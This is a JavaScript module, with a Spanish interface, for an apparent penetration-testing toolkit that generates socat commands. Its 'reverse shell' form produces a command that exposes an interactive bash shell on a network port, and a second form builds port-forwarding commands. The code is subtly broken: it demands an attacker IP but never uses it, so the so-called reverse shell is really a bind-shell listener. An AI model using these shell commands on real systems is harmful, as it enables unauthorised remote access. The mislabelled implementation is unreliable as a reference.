const socatModule = {
    html: `
        <h2>Socat - Generador de Comandos</h2>
        <p>Establece flujos de datos bidireccionales entre dos puntos de la red.</p>

        <div class="form-section">
            <h3>Shell Inversa</h3>
            <label for="lhost">IP del Atacante (LHOST, Obligatorio):</label>
            <input type="text" id="lhost" placeholder="Ej: 192.168.1.1">
            <label for="lport">Puerto del Atacante (LPORT, Obligatorio):</label>
            <input type="number" id="lport" placeholder="Ej: 4444">
            <button onclick="socatModule.generateReverseShell()">Generar Shell Inversa</button>
        </div>
        
        <div class="form-section">
            <h3>Redirección de Puertos</h3>
            <label for="sourcePort">Puerto de Origen (Obligatorio):</label>
            <input type="number" id="sourcePort" placeholder="Ej: 8080">
            <label for="destHost">IP de Destino (Obligatorio):</label>
            <input type="text" id="destHost" placeholder="Ej: 10.0.0.1">
            <label for="destPort">Puerto de Destino (Obligatorio):</label>
            <input type="number" id="destPort" placeholder="Ej: 80">
            <button onclick="socatModule.generatePortForward()">Generar Redirección</button>
        </div>
        
        <div class="command-box">
            <h4>Comando generado:</h4>
            <p id="outputCommand">socat</p>
        </div>
    `,
    
    generateReverseShell: () => {
        const lhost = document.getElementById('lhost').value.trim();
        const lport = document.getElementById('lport').value.trim();

        if (!lhost || !lport) {
            alert("Para una shell inversa, LHOST y LPORT son obligatorios.");
            return;
        }
        
        const command = `socat TCP-LISTEN:${lport},fork EXEC:'bash -li',pty,stderr,sigint,setsid,sane`;
        document.getElementById('outputCommand').textContent = command;
    },

    generatePortForward: () => {
        const sourcePort = document.getElementById('sourcePort').value.trim();
        const destHost = document.getElementById('destHost').value.trim();
        const destPort = document.getElementById('destPort').value.trim();

        if (!sourcePort || !destHost || !destPort) {
            alert("Para la redirección de puertos, todos los campos son obligatorios.");
            return;
        }

        const command = `socat TCP-LISTEN:${sourcePort},fork TCP:${destHost}:${destPort}`;
        document.getElementById('outputCommand').textContent = command;
    }
};

// Se registra la herramienta en el objeto global
toolForms.socat = socatModule;